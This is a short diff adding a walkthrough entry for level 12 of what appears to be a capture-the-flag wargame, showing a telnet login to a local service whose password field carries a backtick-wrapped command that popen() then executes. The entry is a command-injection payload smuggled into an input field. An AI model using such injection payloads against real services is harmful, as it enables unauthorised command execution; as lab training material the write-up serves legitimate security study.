@@ -132,3 +132,11 @@ next level pass:
 
 Level12:
 ----------------
+telnet 127.0.0.1 50001
+Password: `getflag > /tmp/flag12` 
+Command passed as password gets evaluated by popen()
+
+next level pass: 
+
+Level13:
+----------------
